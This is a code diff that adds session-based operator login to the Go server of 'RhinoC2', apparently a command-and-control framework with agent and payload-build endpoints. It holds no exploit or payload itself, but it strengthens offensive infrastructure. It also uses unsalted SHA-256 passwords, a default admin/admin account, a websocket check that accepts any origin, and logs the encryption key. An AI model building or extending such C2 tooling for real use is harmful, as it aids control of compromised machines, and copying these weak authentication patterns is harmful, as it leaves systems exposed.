@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/rand"
+	"crypto/sha256"
 	"encoding/hex"
 	"encoding/json"
 	"flag"
@@ -14,6 +15,7 @@ import (
 	"path/filepath"
 	"rhinoc2/pkg/crypto"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -58,6 +60,13 @@ type Message struct {
 	Data    interface{} `json:"data"`
 }
 
+type Session struct {
+	ID        string
+	Username  string
+	CreatedAt time.Time
+	ExpiresAt time.Time
+}
+
 type Server struct {
 	agents    map[string]*Agent
 	mu        sync.RWMutex
@@ -67,10 +76,13 @@ type Server struct {
 	opMu      sync.RWMutex
 	taskLog   []Task
 	logMu     sync.RWMutex
+	sessions  map[string]*Session
+	sessMu    sync.RWMutex
+	users     map[string]string
 }
 
 func NewServer(key string) *Server {
-	return &Server{
+	s := &Server{
 		agents: make(map[string]*Agent),
 		upgrader: websocket.Upgrader{
 			CheckOrigin: func(r *http.Request) bool { return true },
@@ -78,7 +90,18 @@ func NewServer(key string) *Server {
 		crypto:    crypto.NewCryptoHandler(key),
 		operators: make(map[*websocket.Conn]bool),
 		taskLog:   make([]Task, 0),
+		sessions:  make(map[string]*Session),
+		users:     make(map[string]string),
 	}
+
+	s.initializeUsers()
+	return s
+}
+
+func (s *Server) initializeUsers() {
+	hash := sha256.Sum256([]byte("admin"))
+	s.users["admin"] = hex.EncodeToString(hash[:])
+	log.Println("Default credentials: admin/admin (CHANGE IMMEDIATELY)")
 }
 
 func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
@@ -454,7 +477,6 @@ func (s *Server) serveStatic(w http.ResponseWriter, r *http.Request) {
 	path := r.URL.Path
 	var filePath string
 
-	// Try both relative paths to support running from project root or server directory
 	if path == "/" || path == "/panel.html" {
 		if _, err := os.Stat("../client/panel.html"); err == nil {
 			filePath = "../client/panel.html"
@@ -476,6 +498,145 @@ func (s *Server) serveStatic(w http.ResponseWriter, r *http.Request) {
 	}
 
 	http.ServeFile(w, r, filePath)
+}
+
+func (s *Server) serveLogin(w http.ResponseWriter, r *http.Request) {
+	var filePath string
+	if _, err := os.Stat("../client/login.html"); err == nil {
+		filePath = "../client/login.html"
+	} else {
+		filePath = "client/login.html"
+	}
+	http.ServeFile(w, r, filePath)
+}
+
+func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
+	var creds struct {
+		Username string `json:"username"`
+		Password string `json:"password"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+
+	hash := sha256.Sum256([]byte(creds.Password))
+	passHash := hex.EncodeToString(hash[:])
+
+	s.sessMu.RLock()
+	storedHash, exists := s.users[creds.Username]
+	s.sessMu.RUnlock()
+
+	if !exists || storedHash != passHash {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid credentials"})
+		return
+	}
+
+	sessionID := generateSessionID()
+	session := &Session{
+		ID:        sessionID,
+		Username:  creds.Username,
+		CreatedAt: time.Now(),
+		ExpiresAt: time.Now().Add(24 * time.Hour),
+	}
+
+	s.sessMu.Lock()
+	s.sessions[sessionID] = session
+	s.sessMu.Unlock()
+
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_id",
+		Value:    sessionID,
+		Path:     "/",
+		Expires:  session.ExpiresAt,
+		HttpOnly: true,
+		SameSite: http.SameSiteStrictMode,
+	})
+
+	log.Printf("User %s logged in", creds.Username)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
+}
+
+func (s *Server) handleLogout(w http.ResponseWriter, r *http.Request) {
+	cookie, err := r.Cookie("session_id")
+	if err == nil {
+		s.sessMu.Lock()
+		if session, exists := s.sessions[cookie.Value]; exists {
+			log.Printf("User %s logged out", session.Username)
+			delete(s.sessions, cookie.Value)
+		}
+		s.sessMu.Unlock()
+	}
+
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_id",
+		Value:    "",
+		Path:     "/",
+		MaxAge:   -1,
+		HttpOnly: true,
+	})
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"status": "logged out"})
+}
+
+func (s *Server) requireAuth(next http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		defer func() {
+			if rec := recover(); rec != nil {
+				log.Printf("Panic in requireAuth: %v", rec)
+				http.Error(w, "Internal server error", http.StatusInternalServerError)
+			}
+		}()
+
+		cookie, err := r.Cookie("session_id")
+		if err != nil {
+			log.Printf("No session cookie from %s", r.RemoteAddr)
+			if strings.Contains(r.Header.Get("Accept"), "application/json") {
+				w.Header().Set("Content-Type", "application/json")
+				w.WriteHeader(http.StatusUnauthorized)
+				json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
+			} else {
+				http.Redirect(w, r, "/login", http.StatusSeeOther)
+			}
+			return
+		}
+
+		s.sessMu.RLock()
+		session, exists := s.sessions[cookie.Value]
+		s.sessMu.RUnlock()
+
+		if !exists || time.Now().After(session.ExpiresAt) {
+			log.Printf("Invalid or expired session from %s", r.RemoteAddr)
+			if exists {
+				s.sessMu.Lock()
+				delete(s.sessions, cookie.Value)
+				s.sessMu.Unlock()
+			}
+
+			if strings.Contains(r.Header.Get("Accept"), "application/json") {
+				w.Header().Set("Content-Type", "application/json")
+				w.WriteHeader(http.StatusUnauthorized)
+				json.NewEncoder(w).Encode(map[string]string{"error": "Session expired"})
+			} else {
+				http.Redirect(w, r, "/login", http.StatusSeeOther)
+			}
+			return
+		}
+
+		log.Printf("Auth OK for user %s", session.Username)
+		next(w, r)
+	}
+}
+
+func generateSessionID() string {
+	b := make([]byte, 32)
+	rand.Read(b)
+	return hex.EncodeToString(b)
 }
 
 func (s *Server) handleBuild(w http.ResponseWriter, r *http.Request) {
@@ -678,16 +839,23 @@ func main() {
 	srv := NewServer(config.Key)
 
 	r := mux.NewRouter()
+
+	r.HandleFunc("/login", srv.serveLogin)
+	r.HandleFunc("/api/login", srv.handleLogin).Methods("POST")
+	r.HandleFunc("/api/logout", srv.handleLogout).Methods("POST")
+
 	r.HandleFunc("/api/agent", srv.handleAgent)
-	r.HandleFunc("/api/operator", srv.handleOperator)
-	r.HandleFunc("/api/agents", srv.handleRESTAPI).Methods("GET")
-	r.HandleFunc("/api/build", srv.handleBuild).Methods("POST")
-	r.HandleFunc("/panel.html", srv.serveStatic)
-	r.HandleFunc("/index.html", srv.serveStatic)
-	r.HandleFunc("/", srv.serveStatic)
+
+	r.HandleFunc("/api/operator", srv.requireAuth(srv.handleOperator))
+	r.HandleFunc("/api/agents", srv.requireAuth(srv.handleRESTAPI)).Methods("GET")
+	r.HandleFunc("/api/build", srv.requireAuth(srv.handleBuild)).Methods("POST")
+	r.HandleFunc("/panel.html", srv.requireAuth(srv.serveStatic))
+	r.HandleFunc("/index.html", srv.requireAuth(srv.serveStatic))
+	r.HandleFunc("/", srv.requireAuth(srv.serveStatic))
 
 	addr := config.Host + ":" + config.Port
 	log.Printf("RhinoC2 server starting on %s", addr)
+	log.Printf("Login page: http://localhost:%s/login", config.Port)
 	log.Printf("Web interface: http://localhost:%s", config.Port)
 	log.Printf("REST API: http://localhost:%s/api/agents", config.Port)
 	log.Printf("Encryption key: %s", config.Key)
